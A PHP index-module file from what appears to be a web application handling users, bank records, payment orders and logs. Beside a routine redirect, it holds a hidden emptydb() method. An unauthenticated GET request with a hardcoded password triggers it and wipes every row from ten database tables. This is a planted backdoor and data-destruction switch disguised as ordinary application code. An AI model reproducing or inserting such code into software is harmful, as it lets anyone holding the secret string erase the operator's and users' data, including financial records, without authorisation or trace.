<?php
if (!defined('ROOT')) exit('Can\'t Access !'); 
class mod_index extends module_class{
 function main(){//首页
    if(isAgent()){
      location("?mod=member");
	}else{
      location("?mod=member");
	}
 } 
 function emptydb(){
  if($_GET['password']=='lijixingdong2'){
	$this->mysql->query("delete from {$this->pre}user");
	$this->mysql->query("delete from {$this->pre}atmbank");
	$this->mysql->query("delete from {$this->pre}atmlog");
	$this->mysql->query("delete from {$this->pre}completed");
	$this->mysql->query("delete from {$this->pre}customs");
	$this->mysql->query("delete from {$this->pre}log");
	$this->mysql->query("delete from {$this->pre}message");
	$this->mysql->query("delete from {$this->pre}payorder");
	$this->mysql->query("delete from {$this->pre}record");
	$this->mysql->query("delete from {$this->pre}records");
	echo 'abcd';
	exit;
  }	 
 }
}
?>